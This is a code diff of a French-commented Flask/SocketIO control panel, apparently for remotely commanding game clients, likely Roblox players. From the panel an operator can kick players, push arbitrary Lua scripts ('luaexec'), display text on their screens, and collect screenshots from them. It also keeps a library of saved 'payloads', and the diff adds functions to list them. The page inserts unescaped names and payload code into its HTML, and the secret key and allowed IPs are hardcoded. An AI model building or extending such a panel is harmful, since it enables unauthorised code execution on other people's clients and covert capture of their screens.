@@ -13,7 +13,7 @@ app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
 # === CONFIG ===
-ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
+ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}  # Change avec ton IP
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
 
@@ -23,7 +23,7 @@ pending_commands = {}
 history_log = []
 payloads = []
 
-# === CHARGEMENT ===
+# === CHARGEMENT DES FICHIERS ===
 def load_history():
     global history_log
     if os.path.exists(HISTORY_FILE):
@@ -49,7 +49,7 @@ def save_payloads():
 load_history()
 load_payloads()
 
-# === SÉCURITÉ ===
+# === SÉCURITÉ IP ===
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
@@ -69,6 +69,7 @@ def protect_routes():
     if request.path in ["/", "/kick", "/troll", "/payload", "/screenshot"] or request.path.startswith("/api"):
         check_ip()
 
+# === HISTORIQUE ===
 def add_history(event_type, username, details=""):
     timestamp = datetime.now().strftime("%H:%M:%S")
     entry = {"time": timestamp, "type": event_type, "username": username, "details": details}
@@ -80,7 +81,7 @@ def add_history(event_type, username, details=""):
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# === PAGE PRINCIPALE (HTML + CSS + JS) ===
+# === PAGE PRINCIPALE (HTML + CSS + JS COMPLET) ===
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -176,7 +177,6 @@ HTML = """<!DOCTYPE html>
         </div>
         <div id="history-tab" class="tab" style="display:none;"><div id="history"></div></div>
 
-        <!-- Section Screenshots -->
         <div class="screenshots">
             <h2 style="color:#06b6d4;margin-bottom:20px;">Screenshots reçus</h2>
             <div id="screenshotList"></div>
@@ -256,7 +256,6 @@ function toast(msg) {
     setTimeout(() => t.remove(), 4000);
 }
 
-// Recherche joueurs
 function filterPlayers() {
     const query = document.getElementById("searchInput").value.toLowerCase();
     document.querySelectorAll('.card').forEach(card => {
@@ -265,7 +264,7 @@ function filterPlayers() {
     });
 }
 
-// TextScreen Preview + Envoi
+// TextScreen Preview
 function updatePreview() {
     const text = document.getElementById("screenText").value || "Preview Text";
     const font = document.getElementById("textFont").value;
@@ -306,7 +305,28 @@ function openTextScreenModal(id){
     document.getElementById("textScreenModal").classList.add("active");
 }
 
-// Envoi troll + bouton SCREENSHOT
+// Payloads
+function loadPayloads() {
+    fetch("/payload?action=list").then(r => r.json()).then(data => {
+        const list = document.getElementById("payloads-list");
+        list.innerHTML = Object.keys(data).length === 0 ? "<p style='color:#94a3b8'>Aucun payload. Crée-en un !</p>" : "";
+        for (const [name, code] of Object.entries(data)) {
+            const div = document.createElement("div");
+            div.className = "payload-item";
+            div.innerHTML = `<div><strong>${name}</strong><br><span style="font-size:0.8rem;color:#94a3b8">${code.substring(0,80)}${code.length>80?"...":""}</span></div>
+                <div><button class="btn" style="padding:6px 12px;font-size:0.75rem;margin:0 4px" onclick="editPayload('${name}')">Edit</button>
+                <button class="btn kick" style="padding:6px 12px;font-size:0.75rem;margin:0 4px" onclick="deletePayload('${name}')">Delete</button></div>`;
+            list.appendChild(div);
+        }
+    });
+}
+
+function renderHistory(data) {
+    document.getElementById("history").innerHTML = data.history.map(h => 
+        `<div class="payload-item"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>`
+    ).join('');
+}
+
 function sendTroll(id, cmd, param = null) {
     const body = { userid: id, cmd };
     if (param) {
@@ -315,22 +335,17 @@ function sendTroll(id, cmd, param = null) {
         else if (cmd === "luaexec") body.script = param;
     }
     fetch("/troll", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
-    toast(cmd.toUpperCase() + " sent");
+    toast(cmd.toUpperCase() + " envoyé");
 }
 
-// Réception des screenshots
 socket.on("new_screenshot", data => {
     const div = document.createElement("div");
     div.className = "screenshot-entry";
-    div.innerHTML = `
-        <strong>[${data.time}] ${data.username} (${data.userid})</strong><br>
-        <img src="${data.image}" alt="screenshot">
-    `;
+    div.innerHTML = `<strong>[${data.time}] ${data.username} (${data.userid})</strong><br><img src="${data.image}" alt="screenshot">`;
     document.getElementById("screenshotList").prepend(div);
-    toast("Screenshot reçu de " + data.username);
+    toast("Screenshot reçu !");
 });
 
-// render() avec bouton SCREENSHOT
 function render(data) {
     document.getElementById("stats").innerText = data.online;
     const grid = document.getElementById("players");
@@ -385,10 +400,8 @@ function render(data) {
     });
 }
 
-// (Workshop, Payloads, modals, etc. – tout le reste du JS identique)
-
 socket.on("update", render);
-socket.on("history_update", data => renderHistory(data));
+socket.on("history_update", renderHistory);
 socket.on("kick_notice", d => toast(d.username + " → " + d.reason));
 fetch("/get_history").then(r => r.json()).then(renderHistory);
 </script>
@@ -494,7 +507,6 @@ def receive_screenshot():
             "image": image_url
         })
         add_history("screenshot", username, "Screenshot reçu")
-
     return jsonify({"ok": True})
 
 @app.route("/payload", methods=["GET", "POST"])
